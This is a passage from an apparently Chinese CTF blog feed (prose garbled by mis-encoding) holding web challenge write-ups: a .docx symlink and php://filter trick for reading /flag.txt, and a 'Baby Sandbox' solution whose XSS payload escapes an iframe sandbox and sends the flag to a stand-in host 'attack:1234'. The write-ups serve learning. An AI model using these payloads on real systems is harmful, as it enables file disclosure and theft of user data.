class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$tmpDir</span> = <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;mktemp -d --tmpdir=/tmp/ zipXXXXXXXXX&quot;</span>);<br><span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;unzip <span class="hljs-subst">$zipFilename</span> \&quot;word/media*\&quot; -d \&quot;<span class="hljs-subst">$tmpDir</span>\&quot;&quot;</span>);<br></code></pre></td></tr></table></figure><p>å†çœ‹çœ‹<code>open_basedir</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$tmpDir</span>/word/media&quot;</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å‘ç°ä»–çš„<code>open_basedir</code>æ˜¯åˆ©ç”¨çš„é€šé…ç¬¦ï¼Œæ˜¯ç›´æ¥è®¾ç½®çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡æå‰è®¾ç½®<code>word/medi</code>é“¾æ¥åˆ°<code>/flag.txt</code>æ¥å®ç°æ‹¿åˆ°flag</p><p>è¯¥<code>word/media</code>æ–‡ä»¶å¤¹ä¸æ˜¯ç”± php ä»£ç åˆ›å»ºçš„ï¼Œè€Œæ˜¯æ–‡ä»¶æœ¬èº«æå–çš„ç»“æœ<code>.docx</code>ï¼Œè¿™æ„å‘³ç€æ²¡æœ‰ä»€ä¹ˆå¯ä»¥é˜»æ­¢æˆ‘ä»¬å°†æ­¤æ–‡ä»¶å¤¹æœ¬èº«å®šä¹‰ä¸ºç¬¦å·é“¾æ¥ã€‚å¦‚æœæˆ‘ä»¬å°†å…¶ç¬¦å·é“¾æ¥åˆ°ï¼Œ<code>/</code>é‚£ä¹ˆæˆ‘ä»¬å°†èƒ½å¤ŸåŒ…å«æ–‡ä»¶ç³»ç»Ÿä¸­æˆ‘ä»¬çŸ¥é“åç§°çš„ä»»ä½•æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ ‡å¿—ã€‚æˆ‘ä»¬å¯ä»¥<code>ln</code>åœ¨æˆ‘ä»¬çš„<code>word</code>ç›®å½•ä¸­é€šè¿‡ä»¥ä¸‹æ–¹å¼åˆ›å»ºç¬¦å·é“¾æ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s / media<br></code></pre></td></tr></table></figure><p>è¿™æ¬¡ï¼Œç”±äºæˆ‘ä»¬æƒ³è¦æ³„éœ² çš„å†…å®¹<code>/flag.txt</code>ï¼ˆæˆ–è€…<code>word/media/flag.txt</code>å› ä¸ºå®ƒæ˜¯ç¬¦å·é“¾æ¥åˆ° çš„<code>/</code>ï¼‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ç¼–è¾‘<code>word/_rels/document.xml.rels</code>æ–‡ä»¶ä»¥æ›´æ”¹æˆ‘ä»¬å‡å®šå›¾åƒçš„è·¯å¾„ã€‚PHP ä»£ç å”¯ä¸€éªŒè¯çš„æ˜¯å…³ç³»çš„ç±»å‹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è¾“å…¥æˆ‘ä»¬æƒ³è¦çš„ä»»ä½•è·¯å¾„ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> standalone=<span class="hljs-string">&quot;yes&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Relationships</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId3&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;webSettings.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId2&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;settings.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId1&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;styles.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId6&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;theme/theme1.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId5&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;fontTable.xml&quot;</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId4&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;media/flag.txt&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Relationships</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸ºäº†æˆåŠŸé€šè¿‡è¯¥<code>zlib_decode</code>çº¿è·¯ï¼Œæˆ‘ä»¬éœ€è¦ä¼ é€’ä¸€äº›æœ‰æ•ˆçš„ zlib å‹ç¼©æ•°æ®ã€‚ä½¿ç”¨phpçš„æµè¿‡æ»¤å™¨æ¥å®ç°</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Relationship</span> <span class="hljs-attr">Id</span>=<span class="hljs-string">&quot;rId4&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">Type</span>=<span class="hljs-string">&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">Target</span>=<span class="hljs-string">&quot;media/php://filter/zlib.deflate/resource=flag.txt&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æœ€åä¸€æ¬¡å‹ç¼©æ–‡ä»¶ä»¥å½¢æˆ<code>.docx</code>æ–‡ä»¶å¹¶æäº¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zip -r --symlinks payload.docx *<br></code></pre></td></tr></table></figure><p><a href="https://learn-cyber.net/writeup/zStego">å®˜æ–¹wp</a></p><h2 id="Baby-Sandbox"><a href="#Baby-Sandbox" class="headerlink" title="Baby Sandbox"></a>Baby Sandbox</h2><p>æºç ï¼š</p><p>iframe.ejs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot; /&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;<br>    &lt;title&gt;iframe&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;h1&gt;Your secret&lt;/h1&gt;<br>    &lt;div id=&quot;secret-container&quot;&gt;&lt;/div&gt;<br>    &lt;script&gt;<br>      (function() &#123;<br>        let container = document.getElementById(&quot;secret-container&quot;);<br>        let secretDiv = document.createElement(&quot;div&quot;);<br>        let shadow = secretDiv.attachShadow(&#123; mode: &quot;closed&quot; &#125;);<br>        <br>        let flagElement = document.createElement(&quot;span&quot;);<br>        flagElement.textContent =<br>          localStorage.getItem(&quot;secret&quot;) || &quot;TRX&#123;fake_flag_for_testing&#125;&quot;;<br>        shadow.appendChild(flagElement);<br>        <br>        localStorage.removeItem(&quot;secret&quot;);<br>        container.appendChild(secretDiv);<br>      &#125;)();<br>      <br>      let d = document.createElement(&quot;div&quot;);<br>      d.innerHTML = &quot;&lt;%= payload %&gt;&quot;;<br>      document.body.appendChild(d);<br>    &lt;/script&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>index.ejs:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs ejs">&lt;!DOCTYPE html&gt;<br>&lt;html lang=&quot;en&quot;&gt;<br>  &lt;head&gt;<br>    &lt;meta charset=&quot;UTF-8&quot; /&gt;<br>    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;<br>    &lt;title&gt;Hello&lt;/title&gt;<br>  &lt;/head&gt;<br>  &lt;body&gt;<br>    &lt;iframe<br>      srcdoc=&#x27;&lt;%= include(&quot;iframe&quot;, &#123; payload: payload &#125;) %&gt;&#x27;<br>      sandbox=&quot;allow-scripts allow-same-origin&quot;<br>    &gt;&lt;/iframe&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>bot.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// From ASIS CTF Finals 2024 - leakbin</span><br><br><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;puppeteer&quot;</span>);<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">1337</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">SITE</span> = <span class="hljs-string">`http://localhost:<span class="hljs-subst">$&#123;PORT&#125;</span>`</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> || <span class="hljs-string">&quot;TRX&#123;fake_flag_for_testing&#125;&quot;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">FLAG_REGEX</span> = <span class="hljs-regexp">/^TRX&#123;[a-z0-9_]+&#125;$/</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">sleep</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">ms</span>) =&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">setTimeout</span>(resolve, ms));<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">visit</span> = (<span class="hljs-params">payload</span>) =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-title function_">async</span> (resolve, reject) =&gt; &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">FLAG_REGEX</span>.<span class="hljs-title function_">test</span>(<span class="hljs-variable constant_">FLAG</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Error: Flag does not match flag regex, contact an admin if this is on remote&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">let</span> browser, context, page;<br>        <span class="hljs-keyword">try</span> &#123;<br>            browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>(&#123;<br>                <span class="hljs-attr">headless</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">args</span>: [<br>                    <span class="hljs-string">&#x27;--no-sandbox&#x27;</span>,<br>                    <span class="hljs-string">&#x27;--disable-setuid-sandbox&#x27;</span>,<br>                    <span class="hljs-string">&#x27;--js-flags=--noexpose_wasm,--jitless&#x27;</span> <span class="hljs-comment">// this is a web chall :)</span><br>                ],<br>                <span class="hljs-attr">dumpio</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">pipe</span>: <span class="hljs-literal">true</span>,<br>                <span class="hljs-attr">executablePath</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">PUPPETEER_EXECUTABLE_PATH</span><br>            &#125;);<br><br>            <span class="hljs-comment">// incognito btw</span><br>            context = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">createBrowserContext</span>();<br><br>            page = <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">newPage</span>();<br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-variable constant_">SITE</span>, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&quot;domcontentloaded&quot;</span>, <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> &#125;);<br>            <br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">evaluate</span>(<span class="hljs-function">(<span class="hljs-params">flag</span>) =&gt;</span> &#123;<br>                <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">&quot;secret&quot;</span>, flag);<br>            &#125;, <span class="hljs-variable constant_">FLAG</span>);<br><br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">close</span>();<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>            <span class="hljs-keyword">if</span> (browser) <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();<br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Error: Setup failed, if this happens consistently on remote contact an admin&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-title function_">resolve</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            page = <span class="hljs-keyword">await</span> context.<span class="hljs-title function_">newPage</span>();<br>            <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;SITE&#125;</span>?payload=<span class="hljs-subst">$&#123;<span class="hljs-built_in">encodeURIComponent</span>(payload)&#125;</span>`</span>, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&quot;domcontentloaded&quot;</span>, <span class="hljs-attr">timeout</span>: <span class="hljs-number">5000</span> &#125;);<br>            <span class="hljs-keyword">await</span> <span class="hljs-title function_">sleep</span>(<span class="hljs-number">1000</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (browser) <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();<br>    &#125;);<br>&#125;;<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123; visit &#125;;<br><br></code></pre></td></tr></table></figure><p>server.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;express&quot;</span>);<br><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-keyword">const</span> process = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;process&quot;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>()<br><span class="hljs-keyword">const</span> bot = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./bot&quot;</span>);<br><br><span class="hljs-keyword">let</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">1337</span><br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    res.<span class="hljs-title function_">setHeader</span>(<span class="hljs-string">&quot;Content-Security-Policy&quot;</span>, <span class="hljs-string">&quot;default-src &#x27;none&#x27;; frame-ancestors &#x27;none&#x27;; base-uri &#x27;none&#x27;; form-action &#x27;none&#x27;; script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;;&quot;</span>);<br>    <span class="hljs-title function_">next</span>()<br>&#125;)<br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;view engine&quot;</span>, <span class="hljs-string">&quot;ejs&quot;</span>)<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&quot;views&quot;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&quot;views&quot;</span>))<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> payload = req.<span class="hljs-property">query</span>.<span class="hljs-property">payload</span> || <span class="hljs-string">&#x27;&lt;p&gt;Hello World&lt;/p&gt;&#x27;</span>;<br>    payload = payload.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[^\S ]/g</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br>    res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&quot;index&quot;</span>, &#123; payload &#125;);<br>  &#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/visit&quot;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> payload = req.<span class="hljs-property">body</span>.<span class="hljs-property">payload</span><br>    <span class="hljs-keyword">if</span> (!payload)<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Missing payload&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span> payload !== <span class="hljs-string">&quot;string&quot;</span>)<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Bad request&quot;</span>)<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">let</span> result = <span class="hljs-keyword">await</span> bot.<span class="hljs-title function_">visit</span>(payload)<br>        res.<span class="hljs-title function_">send</span>(result)<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err)<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;An error occurred&quot;</span>)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server running on port <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>)<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>é˜…è¯»æºç ï¼Œå¤§æ¦‚æ˜¯è¦æäº¤ä¸€ä¸ªpayloadç»™&#x2F;visitè·¯ç”±ï¼Œè§¦å‘botå»è®¿é—®æ‹¿åˆ°flag</p><p>ä½†æ˜¯FLAGè¢«æ”¾åœ¨äº†å½±å­æ ‘é‡Œé¢ï¼Œè€Œä¸”æ˜¯å°é—­å¼çš„ï¼Œæ‰‹æ®µéå¸¸æœ‰é™</p><p>æœ€åè¿˜æ˜¯ä¸ä¼šï¼Œè‰¹</p><p>æŸ¥æ‰¾èµ„æ–™é“¾æ¥ï¼š</p><p><a href="https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md">https://github.com/Super-Guesser/ctf/blob/master/2022/dicectf/shadow.md</a></p><p><a href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/">https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/</a></p><p><a href="https://blog.ankursundara.com/shadow-dom/">https://blog.ankursundara.com/shadow-dom/</a></p><p>å‘ç°å›½å¤–å·²ç»æœ‰äº†ç ”ç©¶</p><p>é¦–å…ˆæˆ‘ä»¬è¦è·å–flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-title function_">find</span>(<span class="hljs-string">&#x27;TRX&#x27;</span>);<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">execCommand</span>(<span class="hljs-string">&#x27;SelectAll&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ç„¶åæ‹¿flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag=<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">getSelection</span>().<span class="hljs-title function_">toString</span>()<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¦å¸¦å‡ºflagï¼Œå› ä¸ºæœ‰cspï¼Œåªèƒ½é€šè¿‡è·³è½¬ï¼Œè€Œåœ¨sandboxä¸­è·³è½¬æ˜¯ä¸è¢«å…è®¸çš„ï¼Œæ‰€ä»¥éœ€è¦æ²™ç®±é€ƒé€¸</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250225161914760.png" alt="image-20250225161914760"></p><p>æ³¨æ„åˆ° <code>allow-scripts å’Œallow-same-origin</code>ï¼Œæ˜¯å¯ä»¥ç›´æ¥<code>window.parent.document.body.insertAdjacentHTML</code> æ¥ä¿®æ”¹<code>parent</code>é¡µé€ƒé€¸çš„ï¼Œå®Œæ•´payloadå¦‚ä¸‹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">0</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">&quot;window.find(&#x27;TRX&#x27;);document.execCommand(&#x27;SelectAll&#x27;);var flag=window.getSelection().toString();window.parent.document.body.insertAdjacentHTML(&#x27;beforeend&#x27;, `&lt;meta http-equiv=&#x27;refresh&#x27; content=&#x27;0;url=http://attack:1234/?cookie=$&#123;encodeURIComponent(flag)&#125;&#x27;&gt;`);&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="keeper"><a href="#keeper" class="headerlink" title="keeper"></a>keeper</h2>]]></content>
    
    
    <categories>
      
      <category>æ¯æ—¥ä¸€web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åšå®¢æ—¥å¿—</title>
    <link href="/2025/02/20/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%97/"/>
    <url>/2025/02/20/%E5%8D%9A%E5%AE%A2%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<p>æ­å»ºä¸€ä¸ªå°ç«™(2024.11.12)</p><p>åšå®¢åŠ å…¥åŠ å¯†åŠŸèƒ½(2025.3.14)</p><p>åšå®¢åŠ å…¥è¯„è®ºåŠŸèƒ½(2025.3.20)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linuxææƒ</title>
    <link href="/2025/02/15/linux%E6%8F%90%E6%9D%83/"/>
    <url>/2025/02/15/linux%E6%8F%90%E6%9D%83/</url>
    
